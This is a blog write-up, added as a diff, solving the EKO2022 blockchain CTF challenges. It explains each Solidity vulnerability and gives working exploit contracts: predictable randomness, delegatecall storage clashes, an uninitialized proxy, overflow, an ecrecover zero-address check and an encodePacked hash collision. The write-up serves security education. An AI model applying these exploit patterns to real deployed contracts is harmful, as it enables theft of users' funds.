@@ -1,0 +1,835 @@
+# Write-Up: EKO2022 Blockchain CTF
+
+<p className="text-xs text-right">November 5, 2022 by [patrickd](/about#patrickd)</p>
+
+This is a write-up for [a collection of challenges](https://www.ctfprotocol.com/tracks/eko2022) made for [EKOparty](https://www.ekoparty.org/), an annual information security conference in Latin America.
+
+
+## The Lost Kitty
+
+>Lucas is a scientist who lives with his cat in a big house that has 2^256 rooms. His cat likes to play hide and seek and jumps to a random room whenever it hears a door opening in another one. Can you find Lucas' cat? Set the variable `catFound` to `true` to win this challenge.
+>
+>*by [Br0niclΞ | luksgrin.lens](https://twitter.com/Cryptonicle1)*
+
+The Factory contract, which takes care of this Challenge's setup, deploys a `House`, which when called with a room-guess deploys a `HiddenKittyCat` and checks whether the correct `slot` was specified.
+
+```solidity
+contract House {
+    bool public catFound;
+
+    function isKittyCatHere(bytes32 slot) external {
+        ...
+        HiddenKittyCat hiddenKittyCat = new HiddenKittyCat();
+        bool found = hiddenKittyCat.areYouHidingHere(slot);
+        ...
+```
+
+The use of the word "slot" and the fact that the House has $2^{256}$ "rooms" pretty much gives away that the kitty is hiding in storage slots. In Ethereum this is the place where data can be stored persistently between transactions. Storage is accessed like a simple key-value-store where both the key and the value can be 32 bytes large. This maximum size of keys restricts the amount of available storage slots to the above-mentioned number of rooms.
+
+```solidity
+contract HiddenKittyCat {
+    ...
+
+    constructor() {
+        ...
+        bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));
+
+        assembly {
+            sstore(slot, "KittyCat!")
+        }
+    }
+
+    function areYouHidingHere(bytes32 slot) external view returns (bool) {
+        ...
+        bytes32 _kittyPointer;
+
+        assembly {
+            _kittyPointer := sload(slot)
+        }
+
+        return _kittyPointer == "KittyCat!";
+    }
+```
+
+During the deployment of a new `HiddenKittyCat` a "random" slot is selected by hashing the current block's timestamp and the blockhash from 69 blocks ago. What "blockhashes" are has changed quite a bit since The Merge, but it's irrelevant for the scope of this challenge - just take it as a block's unique hash. The string `"KittyCat!"` is written to the generated slot as the `value`, so it can later check for it when the slot we guessed is tested.
+
+This is a very classic example of "Bad/Predictable Randomness" in Ethereum: Although you can't really guess the slot correctly when calling `isKittyCatHere()` directly before making a transaction, you can instead simply deploy another contract that creates the same hash (since both block-values will be the same for all contracts executed within the same block) and then calls the challenge with the correct guess for you.
+
+```solidity
+contract CatMindReader {
+    constructor(House house) {
+        bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));
+        house.isKittyCatHere(slot);
+    }
+}
+```
+
+
+## Hack the Mothership
+
+>You and a small group of scientists have been working on a global counteroffensive against the invader.
+>We've recovered some of the ship's source code and need to find a way to hack it!
+>You have already studied the code and realized that to survive you need to take control of the Mothership.
+>Your objective is to hack the Mothership instance (change the hacked bool to true).
+>Good luck, the earth's future depends on you!
+>
+>*by [nicobevi.eth](https://twitter.com/nicobevi_eth)*
+
+This challenge seems a bit overwhelming from all of the code given, but the goal is once again to flip a boolean. And for that, we apparently have to become the `leader` of the `Mothership`.
+
+```solidity
+contract Mothership {
+    address public leader;
+
+    SpaceShip[] public fleet;
+    mapping(address => SpaceShip) public captainRegisteredShip;
+
+    bool public hacked;
+
+    constructor() {
+        leader = msg.sender;
+
+        address[5] memory captains = [
+            0x0000000000000000000000000000000000000001,
+            0x0000000000000000000000000000000000000002,
+            0x0000000000000000000000000000000000000003,
+            0x0000000000000000000000000000000000000004,
+            0x0000000000000000000000000000000000000005
+        ];
+
+        for (uint8 i = 0; i < 5; i++) {
+            SpaceShip _spaceship = new SpaceShip(
+                captains[i],
+                address(this)
+            );
+            fleet.push(_spaceship);
+            captainRegisteredShip[captains[i]] = _spaceship;
+        }
+    }
+
+    ...
+
+    function hack() external {
+        require(leader == msg.sender, "You are not our leader");
+        hacked = true;
+    }
+
+    ...
+}
+```
+
+The `leader` of the `Mothership` is elected by the `captains` of the `SpaceShip`s. A `SpaceShip`'s `crew` member can ask for a new `captain` but only if there's currently none set.
+
+The thing that stands out though is how `SpaceShips` have modules. The constructor deploys several "Module" contracts which the contract delegate-calls to via the `fallback()` function.
+
+* The `fallback()` function is called whenever there's no function matching the signature that was requested in the calldata. So whenever someone attempts to call a function that `SpaceShip` itself does not implement, the fallback will be triggered instead.
+* A *delegate-call* is similar to a normal external call but with the significant difference that the caller's context will be used instead of the context of the called contract. Most importantly, this means that the called contract will apply any changes to storage to the caller's state instead of to its own.
+
+```solidity
+contract SpaceShip {
+    address public captain;
+    address[] public crew;
+    Mothership public mothership;
+
+    mapping(bytes4 => address) public modules;
+
+    constructor(address _captain, address _mothership) {
+        captain = _captain;
+        mothership = Mothership(_mothership);
+
+        // Adding standard modules
+        address cleaningModuleAddress = address(new CleaningModule());
+        modules[CleaningModule.replaceCleaningCompany.selector] = cleaningModuleAddress;
+
+        address refuelModuleAddress = address(new RefuelModule());
+        modules[RefuelModule.addAlternativeRefuelStationsCodes.selector] = refuelModuleAddress;
+
+        address leadershipModuleAddress = address(new LeadershipModule());
+        modules[LeadershipModule.isLeaderApproved.selector] = leadershipModuleAddress;
+    }
+
+    ...
+
+    // solhint-disable-next-line no-complex-fallback
+    fallback() external {
+        bytes4 sig4 = msg.sig;
+
+        address module = modules[sig4];
+        require(module != address(0), "invalid module");
+
+        // call the module
+        // solhint-disable-next-line avoid-low-level-calls
+        (bool success,) = module.delegatecall(msg.data);
+        if (!success) {
+            // return response error
+            assembly {
+                returndatacopy(0, 0, returndatasize())
+                revert(0, returndatasize())
+            }
+        }
+    }
+}
+```
+
+Two of these Modules do not have any access controls and they also have a bug.
+
+```solidity
+contract CleaningModule {
+    address private cleaningCompany;
+
+    function replaceCleaningCompany(address _cleaningCompany) external {
+        cleaningCompany = _cleaningCompany;
+    }
+
+....
+
+contract RefuelModule {
+    uint256 private mainRefuelStation;
+    uint256[] private alternativeRefuelStationsCodes;
+
+    function addAlternativeRefuelStationsCodes(uint256 refuelStationCode) external {
+        alternativeRefuelStationsCodes.push(refuelStationCode);
+    }
+...
+```
+
+Whenever the `CleaningModule` overwrites the current `cleaningCompany`, it would also overwrite whatever is currently held at this same position in storage of the callee. In case of `SpaceShip` delegate-calling to `CleaningModule`, setting the `cleaningCompany` would end up overwriting the `captain` state variable.
+
+```solidity
+contract Exploit {
+    Mothership public mothership;
+    constructor(Mothership _mothership) {
+        mothership = _mothership;
+    }
+    function pwn() external {
+        PuppetCaptain puppet;
+
+        // Iterate through fleet.
+        for (uint8 i = 0; i < mothership.fleetLength(); i++) {
+            SpaceShip spaceship = mothership.fleet(i);
+
+            // Each SpaceShip needs to have a different captain, let's deploy some puppets under our control.
+            puppet = new PuppetCaptain(spaceship);
+
+            // Overwrite captain of SpaceShip, setting it to zero-address so crew can ask for new captain.
+            CleaningModule(address(spaceship)).replaceCleaningCompany(address(0x0));
+
+            // Add this contract as crew member using another storage clash in RefuelModule.
+            RefuelModule(address(spaceship)).addAlternativeRefuelStationsCodes(uint256(uint160(address(this))));
+
+            // Elect puppet contract as new captain.
+            spaceship.askForNewCaptain(address(puppet));
+
+            // Let the captain do what only the captain can do.
+            puppet.corruptLeadership();
+        }
+
+        // All SpaceShips are now under control of puppet captains that'll approve anyone to becomethe new leader.
+        // Use this to promote the last puppet we used as new leader.
+        puppet.selfPromotion();
+    }
+
+    // This contract will become the new LeaderShip module for all SpaceShips.
+    function isLeaderApproved(address) external pure {}
+}
+
+contract PuppetCaptain {
+    SpaceShip public spaceship;
+    constructor(SpaceShip _spaceship) {
+        spaceship = _spaceship;
+    }
+    function corruptLeadership() external {
+        // Current Leadership Module would reject any vote.
+        // Making the Exploit contract the new module handling leader elections.
+        spaceship.addModule(LeadershipModule.isLeaderApproved.selector, msg.sender);
+    }
+    function selfPromotion() external {
+        Mothership mothership = spaceship.mothership();
+        mothership.promoteToLeader(address(this));
+
+        // Being the leader now, we can hack the Mothership.
+        mothership.hack();
+    }
+}
+```
+
+
+## Trickster
+
+>We might have spotted a honeypot... Can you manage to obtain the real jackpot?
+>Hacking casino slot machines is considered illegal.
+>
+>*by [matta](https://twitter.com/mattaereal)*
+
+The `ChallengeFactory` that sets this one up shows that the `JackpotProxy` will be deployed with 0.0001 of ether and we must make it return a `balance` of zero.
+
+```solidity
+contract ChallengeTricksterFactory is ChallengeFactory {
+
+    function deploy(address) external payable override returns (address[] memory ret) {
+        require(msg.value == 0.0001 ether, "Please pay 0.0001 ether");
+        address _challenge = address(new JackpotProxy{value: msg.value}());
+    ...
+
+    function isComplete(address[] calldata _challenges) external view override returns (bool) {
+        // @dev to win this challenge you must drain the contract
+        return JackpotProxy(payable(_challenges[0])).balance() == 0;
+    }
+```
+
+The `JackpotProxy` then deploys a `Jackpot` contract and transfers all of the ether it received to it. Apparently, the code wants to make us believe that the proxy keeps the balance...
+
+```solidity
+contract JackpotProxy {
+    address private owner;
+    address private jackpot;
+    ...
+
+    constructor() payable {
+        owner = msg.sender;
+        address _proxy = address(new Jackpot());
+        initialize(_proxy);
+        payable(_proxy).transfer(address(this).balance);
+    }
+
+    function initialize(address _jackpot) public onlyOwner {
+        jackpot = _jackpot;
+    }
+```
+
+But the actual `Jackpot` contract that now has the balance was never actually initialized. We can call `initialize` with our own address and then simply execute `claimPrize()` with half of the balance.
+
+```solidity
+contract Jackpot {
+    address private jackpotProxy;
+    ...
+
+    function initialize(address _jackpotProxy) public payable {
+        jackpotProxy = _jackpotProxy;
+    }
+    ...
+
+    function claimPrize(uint256 amount) external payable onlyJackpotProxy {
+        payable(msg.sender).transfer(amount * 2);
+    }
+```
+
+There are two tricks to this challenge: Not falling for purposefully confusing code and attempting to `claimPrize()` on `JackpotProxy` instead. Plus figuring out the address of the `Jackpot` contract which `JackpotProxy` keeps behind a `private` state variable.
+
+"Private" only means that it's not allowing other contracts to read the value though. All storage is still readably stored on the blockchain and even if it weren't stored one could still look at the contract creations that happened during the deployment transactions (eg. on etherscan).
+
+
+## Smart Horrocrux
+
+>Some security researchers have recently found an eighth Horrocrux, it seems that Voldemort has link to a smart contract, can you destroy it?
+>
+>*by [bengalaQ](https://twitter.com/AugustitoQ)*
+
+From the description, it's quite clear that we somehow have to call the `kill()` function without it reverting, and to do that it needs to be called from the contract itself.
+
+```solidity
+function kill() external {
+    require(msg.sender == address(this), "No one can kill me");
+    alive = false;
+    selfdestruct(payable(tx.origin));
+}
+```
+
+The function that would allow us to do that is `destroyIt()`, but it too has some requirements to call it:
+
+* The first 32 bytes of the `spell` parameter need to match the value from the `_spell` constant.
+* The `invincible` state variable has to be flipped to false.
+* The `magic` integer will be subtracted from the `spell` and the result needs to be calldata that ends up calling the `kill()` function.
+
+```solidity
+function destroyIt(string memory spell, uint256 magic) public {
+    bytes32 spellInBytes;
+    assembly {
+        spellInBytes := mload(add(spell, 32))
+    }
+    require(spellInBytes == _spell, "That spell wouldn't kill a fly");
+    require(!invincible, "The Horrocrux is still invincible");
+
+    bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic)));
+    address(this).call(kedavra);
+}
+```
+
+The first 4 bytes of keccak-256 hashing `kill()` are `41c0e1b5`. From that we can calculate the magic number
+
+```plaintext
+  0x45746865724b6164616272610000000000000000000000000000000000000000 _spell
+- 0x41c0e1b500000000000000000000000000000000000000000000000000000000 kill() calldata
+= 0x03b386b0724b6164616272610000000000000000000000000000000000000000 magic
+```
+
+Now, all that's left, is flipping `invincible` and to do so we need to somehow remove 1 wei from the contract's balance.
+
+```solidity
+constructor() payable {
+    require(msg.value == 2, "Pay Horrorcrux creation price");
+    setInvincible();
+}
+
+function setInvincible() public {
+    invincible = (address(this).balance == 1) ? false : true;
+}
+```
+
+To do that, it appears we can first trigger the `fallback()` function to drain the 2 initial wei and then inject 1 wei via self-destruct (we can't simply send it since that would trigger `fallback()` again and just send it back).
+
+```solidity
+fallback() external {
+    uint256 b = address(this).balance;
+    invincible = true;
+    if (b > 0) {
+        tx.origin.call{value: b}("");
+    }
+}
+```
+
+All of this can be nicely packed up into an Exploit:
+
+```solidity
+contract SmartPointyKnife {
+    constructor(SmartHorrocrux crux) payable {
+        require(msg.value == 1, "need 1 wei to inject");
+
+        // Drain Horrocrux balance via fallback().
+        address(crux).call(hex"");
+
+        // Inject 1 wei without triggering fallback().
+        new SacrificialLamb{value: 1}(payable(address(crux)));
+
+        // Flip invincible variable.
+        crux.setInvincible();
+
+        // Call kill() via destroyIt().
+        crux.destroyIt(
+            hex"45746865724b6164616272610000000000000000000000000000000000000000", // same as _spell
+            0x03b386b0724b6164616272610000000000000000000000000000000000000000     // _spell - magic = kill()
+        );
+    }
+}
+contract SacrificialLamb {
+    constructor(address payable crux) payable {
+        selfdestruct(crux);
+    }
+}
+```
+
+
+## Gas Valve
+
+> The evil Dr. N. Gas has put into orbit a machine that can suck all the air out of the atmosphere. You sneaked into his spaceship and must find a nozzle to open the main valve and stop the machine! Assert the situation and don't panic. Hint: on the valve is marked "model no. EIP-150"
+>
+>*by [Bahurum](https://twitter.com/bahurum)*
+
+To *open* the `Valve` we need to call `openValve()` with an address that has a contract implementing `INozzle's insert()` function.
+
+```solidity
+contract Valve {
+    bool public open;
+
+    function useNozzle(INozzle nozzle) public returns (bool) {
+        try nozzle.insert() returns (bool result) {
+            return result;
+        } catch {
+            return false;
+        }
+    }
+
+    function openValve(INozzle nozzle) external {
+        open = true;
+        (bool success,) = address(this).call(abi.encodeWithSelector(this.useNozzle.selector, nozzle));
+        require(!success);
+    }
+}
+```
+
+The difficulty lies in having this function cause an error despite reverts being caught by the try-catch. This might seem impossible at first but the model number hints at EIP-150 which discusses gas costs - and that basically gives away the solution: Whenever a CALL is made to another contract, 1/64th of gas is kept by the caller to increase the likelihood that even if the callee consumes all gas that was sent, the caller still has enough gas left to do a few actions afterward.
+
+Therefore we have to do 2 things:
+
+* Send a transaction with a gas limit that is high enough for `openValve()` to succeed but too low for `useNozzle()` to function without reverting.
+* Have the `insert()` function use up all gas that was sent (we can use the INVALID opcode to do so).
+
+```solidity
+contract Crowbar is INozzle {
+    function smash(Valve valve) external {
+        valve.openValve(this);
+    }
+    function insert() external pure returns (bool) {
+        assembly {
+            invalid()
+        }
+    }
+}
+```
+
+Now, you could do some gas usage measurements and calculations to determine the exact range of values that work - or you could just try a couple guesses (100k worked for me in remix).
+
+
+## Pelusa
+
+>You just open your eyes and are in Mexico 1986, help Diego to set the score from 1 to 2 goals for a win, do whatever is necessary!
+>
+>*by [0x4non](https://twitter.com/eugenioclrc)*
+
+This is another puzzle-type challenge where certain conditions have to be met to be able to call certain functions in a certain way to adjust certain state variables. More specifically, we have to increase `goals` by one.
+
+There's nowhere in the code where this variable is updated but we can instead do it ourselves during the delegate-call made by the `shoot()` function:
+
+```solidity
+function shoot() external {
+    require(isGoal(), "missed");
+    /// @dev use "the hand of god" trick
+    (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
+    require(success, "missed");
+    require(uint256(bytes32(data)) == 22_06_1986);
+}
+```
+
+Requirements are that
+
+* `isGoal()` returns true, and for that, the `player` contract needs to return the `owner` value when `getBallPossesion()` is called.
+* The delegate-called `handOfGod()` function must succeed and return the integer `22061986` (you can just ignore the underscores, they have no effect).
+
+Determining the owner is quite simple although it's a private immutable variable. We just have to find out the `msg.sender` that deployed the contract and the `blockhash` of when the transaction was included, then hash these values and convert them to an address.
+
+```solidity
+function passTheBall() external {
+    require(msg.sender.code.length == 0, "Only EOA players");
+    /// @dev "la pelota siempre al 10"
+    require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");
+
+    player = msg.sender;
+}
+```
+
+The tricky part is setting a player that is an EOA (a wallet with a key-pair and not a contract) and at the same time a contract that implements the `getBallPossesion()` and `handOfGod()` functions. The checks want to ensure that the `msg.sender` is an EOA by ensuring that there's no code at its address, but while it's correct that EOAs do not have code, it's easy to forget that contracts currently being deployed (meaning their constructor is being executed) do not have any code at their address yet either (because the runtime bytecode that'll be placed at the address is being generated by the constructor).
+
+The last condition is that our contract needs to have an address that when divided by 100 has a rest of 10. Addresses are based on hashing and to find one that matches a specific requirement one does not come around brute force.
+
+1. We could brute force different public keys of the EOA that'll deploy the contract until the first deployed contract's address will end up what we need.
+2. We could keep using the same EOA and just increase the nonce by making other successful transfers until we find a nonce that'd deploy the contract to a fitting address.
+3. We could deploy a contract that keeps increasing its own nonce by deploying other contracts until once again a nonce is found to satisfy the requirement for deploying the actual exploit.
+4. We could make use of the CREATE2 opcode to, instead of increasing a nonce, trying different salts until one works.
+
+There's no need to get too fancy with this though since it's quite easy to find a satisfying address even by just repeatedly hitting the deploy button.
+
+```solidity
+contract AimBot is IGame {
+    address public immutable owner;
+    Pelusa public immutable pelusa;
+
+    // Matching the storage layout of Pelosa.
+    address internal player;
+    uint256 public goals = 1;
+
+    // Bypassing EOA check by passing the ball within constructor.
+    constructor(address _deployer, bytes32 _blockhash, Pelusa _pelusa) {
+        owner = address(uint160(uint256(keccak256(abi.encodePacked(_deployer, _blockhash)))));
+        pelusa = _pelusa;
+
+        pelusa.passTheBall();
+    }
+
+    function shoot() external {
+        pelusa.shoot();
+    }
+
+    // Implementing the functions Pelosa will call during shoot().
+    function getBallPossesion() override external view returns (address) {
+        return owner;
+    }
+    function handOfGod() external returns (uint256) {
+        // Since this function will be delegate-called, the goals that are
+        // actually being increased are the ones of Pelusa.
+        goals++;
+        return 22_06_1986;
+    }
+}
+```
+
+
+## Phoenixtto
+
+>Within the world of crossovers there is a special one, where the universes of pokemon, harry potter and solidity intertwine. In this crossover a mixed creature is created between dumbledore's phoenix, a wild ditto and since we are in the solidity universe this creature is a contract. We have called it Phoenixtto and it has two important abilities, that of being reborn from it's ashes after its destruction and that of copying the behavior of another bytecode.
+>
+>Try to capture the Phoenixtto, if you can...
+>
+>*by [Rotciv](https://twitter.com/victor93389091)*
+
+In the challenge's factory contract, we can see that the `Laboratory` contract is deployed and then its `mergePhoenixDitto()` function is called. We can also see that the goal is to change the `Phoenixtto`'s `owner` variable to us, the `player`.
+
+```solidity
+function deploy(address _player) external payable override returns (address[] memory ret) {
+    ...
+    address _challenge = address(new Laboratory(_player));
+    Laboratory(_challenge).mergePhoenixDitto();
+    ...
+```
+
+What happens during the merge-call seems complicated, but the first part could basically be rewritten to `getImplementation = new Phoenixtto()`. Afterward though, some raw bytecode is deployed, which is most likely a simple proxy.
+
+```solidity
+function mergePhoenixDitto() public {
+    reBorn(type(Phoenixtto).creationCode);
+}
+
+function reBorn(bytes memory _code) public {
+    address x;
+    assembly {
+        x := create(0, add(0x20, _code), mload(_code))
+    }
+    getImplementation = x;
+
+    _code = hex"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3";
+    assembly {
+        x := create2(0, add(_code, 0x20), mload(_code), 0)
+    }
+    addr = x;
+    Phoenixtto(x).reBorn();
+}
+```
+
+Proxies in Ethereum smart contracts can be used to create "cheap clones" of other contracts. Cheap because there's no need to re-deploy the entire large bytecode holding the actual implementation when you can instead just deploy multiple smaller smart contracts that delegate-call all of the requests made to them to the implementation. That way, all that the proxies hold is their own state but the code is re-usably stored at a single address. For some reason, reBorn does not appear to reuse the same implementation though...
+
+Since the CREATE2 opcode deploying the proxy statically re-uses the same bytecode and salt (0), no matter how many times the `Phoenixtto` contract self-destructs itself it should always end up back at the same address.
+
+```solidity
+function capture(string memory _newOwner) external {
+    if (!_isBorn || msg.sender != tx.origin) return;
+
+    address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));
+    if (newOwner == msg.sender) {
+        owner = newOwner;
+    } else {
+        selfdestruct(payable(msg.sender));
+        _isBorn = false;
+    }
+}
+```
+
+Like the previous challenge, this too wants to make sure that the `msg.sender` is an EOA, it does so in a way that cannot be bypassed though. It achieves this by comparing  `msg.sender` to `tx.origin`, which always contains the address of the EOA that signed the current transaction. Only EOAs can sign transactions, therefore the `msg.sender` will be forced to be an EOA.
+
+And as also previously mentioned, to generate an EOA's address we need to hash its public key. So the solution is quite simply calling the `capture()` function directly while supplying the EOA's public key as parameter.
+
+```plaintext
+0000    58    PC
+0001    60    PUSH1 0x20
+0003    81    DUP2
+0004    58    PC
+0005    60    PUSH1 0x1c
+0007    33    CALLER
+0008    5A    GAS
+0009    63    PUSH4 0xaaf10f42
+000E    87    DUP8
+000F    52    MSTORE
+0010    FA    STATICCALL
+0011    15    ISZERO
+0012    81    DUP2
+0013    51    MLOAD
+0014    80    DUP1
+0015    3B    EXTCODESIZE
+0016    80    DUP1
+0017    93    SWAP4
+0018    80    DUP1
+0019    91    SWAP2
+001A    92    SWAP3
+001B    3C    EXTCODECOPY
+001C    F3    *RETURN
+```
+
+To check my assumptions so far, I disassembled the hardcoded bytecode to find what is clearly not a proxy: What seems to be actually happening here is that it'll call `getImplementation()` on the `Laboratory` to then copy the `Phoenixtto`'s code to itself. Well, that's less gas efficient than expected but it won't change the solution.
+
+
+## The Golden Ticket
+
+>The organizers of Ekoparty decided that the tickets for the 2023 conference would be purchased through a smart contract. However, the conference is oversold and you have to sign up for a waitlist to get your ticket. The problem is that they put you on hold for ten years and the only option you have is to extend the wait. After the wait is over, you have to enter a raffle to see if you get the ticket
+>
+>*by [chiin](https://linktr.ee/chiin.eth)*
+
+In this challenge, we (or rather, the EOA that is the `player` that deployed the challenge instance) need to obtain a ticket (flipping `hasTicket` to `true`).
+
+But at the beginning, we'll only be able to successfully call the `joinWaitlist()` function.
+
+```solidity
+contract GoldenTicket {
+    mapping(address => uint40) public waitlist;
+    ...
+
+    function updateWaitTime(uint256 _time) external {
+        require(waitlist[msg.sender] != 0, "Join waitlist first");
+        unchecked {
+            waitlist[msg.sender] += uint40(_time);
+        }
+    }
+```
+
+After that, we'll be able to call `updateWaitTime()` to increase the time we'd have to wait even further. With uint40 though the maximum possible timestamp will be $(2^{40})-1$ and thanks to the fact that this update happens within a `unchecked`-block we can easily cause the integer to overflow by supplying a sufficiently high `_time` value.
+
+```solidity
+function joinRaffle(uint256 _guess) external {
+    require(waitlist[msg.sender] != 0, "Not in waitlist");
+    require(waitlist[msg.sender] <= block.timestamp, "Still have to wait");
+    require(!hasTicket[msg.sender], "Already have a ticket");
+    uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
+    if (randomNumber == _guess) {
+        hasTicket[msg.sender] = true;
+    }
+    delete waitlist[msg.sender];
+}
+```
+
+Having bypassed the waitlist, we're now able to take part in the raffle by exploiting the bad randomness. In this version of the challenge, a `giftTicket()` function was added to allow exploiting this the easy way using smart contracts and then transferring the ticket to the player's EOA.
+
+Before though, you'd have needed to somehow trick the system into thinking that your player is actually a smart contract, or use something like flashbots to gain more control over the block that your transaction will be placed in. (This turned out to be a little too hard)
+
+```solidity
+contract GoldenCracker {
+    constructor(GoldenTicket goldenTicket) {
+        goldenTicket.joinWaitlist();
+
+        // Make waitlist timestamp overflow to 1.
+        uint40 waitTime = uint40(block.timestamp + 10 * 365 days);
+        goldenTicket.updateWaitTime(type(uint40).max - waitTime + 2);
+
+        // Predict guess.
+        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
+        goldenTicket.joinRaffle(randomNumber);
+
+        // Gift ticket to player.
+        goldenTicket.giftTicket(msg.sender);
+    }
+}
+```
+
+
+## Stonks
+
+>You have infiltrated in a big investment firm (name says something about arrows), your task is to loose all their money.
+>
+>*by [0x4non](https://twitter.com/eugenioclrc)*
+
+There's not really much to do here other than calling the buy and sell functions.
+
+```solidity
+uint256 public constant ORACLE_TSLA_GME = 50;
+
+function buyTSLA(uint256 amountGMEin, uint256 amountTSLAout) external {
+    require(amountGMEin / ORACLE_TSLA_GME == amountTSLAout, "Invalid price");
+    _balances[msg.sender][GME] -= amountGMEin;
+    _balances[msg.sender][TSLA] += amountTSLAout;
+}
+function sellTSLA(uint256 amountTSLAin, uint256 amountGMEout) external {
+    require(amountTSLAin * ORACLE_TSLA_GME == amountGMEout, "Invalid price");
+    _balances[msg.sender][TSLA] -= amountTSLAin;
+    _balances[msg.sender][GME] += amountGMEout;
+}
+```
+
+Integers and division should ring a bell. What's 49/50?
+
+So basically you just have to first sell all TSLA. Then keep buying TSLA for `amountGMEin`s smaller than TSLA's price of 50.
+
+
+## Metaverse Supermarket
+
+>We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. Stability has become a scarce resource and even going to the store is a painful experience: we need to rely on oracles that sign off-chain data that lasts a couple of blocks because updating prices on-chain would be complete madness.
+>You are out of INFLAs and you are starving, can you defeat the system?
+>
+>*by [adriro](https://twitter.com/adrianromero)*
+
+This one seems a bit more complex, so let's start by checking the success conditions from the factory contract.
+
+```solidity
+function isComplete(...) external view override returns (bool) {
+    return IERC721(address(InflaStore(challenge).meal())).balanceOf(player) >= 10;
+}
+```
+
+Apparently we need to obtain at least 10 MEAL NFTs and we're starting with 10 wei of Infla coins, which is nowhere close to the hardcoded price of 1 million wei we need for a single meal!
+
+```solidity
+uint256 public constant MEAL_PRICE = 1e6;
+
+constructor(address player) EIP712("InflaStore", "1.0") {
+    meal = new Meal();
+    infla = new Infla(player, 10);
+```
+
+All that leaves us with is somehow tricking the `buyUsingOracle()` to accept a manipulated price.
+
+```solidity
+function buyUsingOracle(OraclePrice calldata oraclePrice, Signature calldata signature) external {
+    _validateOraclePrice(oraclePrice, signature);
+    _mintMeal(msg.sender, oraclePrice.price);
+}
+
+function _validateOraclePrice(OraclePrice calldata oraclePrice, Signature calldata signature) private view {
+    require(block.number - oraclePrice.blockNumber < BLOCK_RANGE, "price too old!");
+
+    bytes32 oracleHash = _hashOraclePrice(oraclePrice);
+    address recovered = _recover(oracleHash, signature.v, signature.r, signature.s);
+
+    require(recovered == oracle, "not oracle!");
+}
+
+function _recover(bytes32 digest, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
+    require(v == 27 || v == 28, "invalid v!");
+    return ecrecover(digest, v, r, s);
+}
+```
+
+Now, you might start checking the implementation of the signature validation for any errors. You can take a look at OpenZeppelin's contracts and usage instructions and you might learn that this sure looks like it's vulnerable to signature malleability. But that wouldn't matter, since even if we change a signature into a different form, it would still sign the same thing. And we don't have anything to change and replay in the first place.
+
+But this is the right train of thought: Checking what is missing. And what really is missing here is that the oracle's address is actually never set. Not by the factory. Not during construction. Therefore it's the zero-address.
+
+Now the important detail one has to know is that whenever `ecrecover()` fails it doesn't revert, but instead it returns the zero-address. So if we submit any `OraclePrice` with an invalid `Signature` the returned address of `_recover()` will match the `oracle` address and therefore the signature will be considered valid.
+
+```solidity
+store.buyUsingOracle(
+    OraclePrice(
+        block.number,
+        0 // price
+    ),
+    Signature(28, bytes32(0), bytes32(0))
+);
+```
+
+If you run into trouble while attempting to solve this, don't forget to give an allowance to the store if you pick a price of 1 wei. And make sure that your contract implements `ERC721TokenReceiver` if you're using one to solve this.
+
+
+## RootMe
+
+>Can you trick the machine to get root access?
+>
+>*by [tinchoabbate](https://twitter.com/tinchoabbate)*
+
+The goal of this challenge is setting the boolean `victory` to `true` which is only possible via the `write()` function that allows to arbitrarily change the contract's storage slots. Victory will end up in slot 0 and simply writing the maximum uint256 to it should flip the bit even without knowing how exactly booleans are stored within the slot.
+
+Preventing us from doing this is a `onlyRoot` modifier that is part of kind of a user-based access control that was implemented in this contract. The bug that this system has, is actually quite obvious if you're familiar with this pattern:
+
+```solidity
+function _getIdentifier(string memory user, string memory salt) private pure returns (bytes32) {
+    return keccak256(abi.encodePacked(user, salt));
+}
+```
+
+What `encodePacked()` does, is simply concatenating both strings. One might think that by hashing them this way, they would always end up with a unique hash for each user. After all, the `usernames` map makes sure that we aren't able to register the same user with a different salt.
+
+The issue here is typically referred to as "Hash Collision" and happens when values of variable length are hashed: `keccak256(abi.encodePacked("ROOT", "ROOT)) == keccak256(abi.encodePacked("ROO", "TROOT")){:solidity}`.
+
+The solution is therefore registering a user with a salt that will produce a hash colliding with the hash of the ROOT user.
+
+```solidity
+contract Exploit {
+    constructor(RootMe target) {
+        target.register("ROO", "TROOT");
+        target.write(bytes32(uint256(0x0)), bytes32(type(uint256).max));
+        assert(target.victory());
+    }
+}
+```
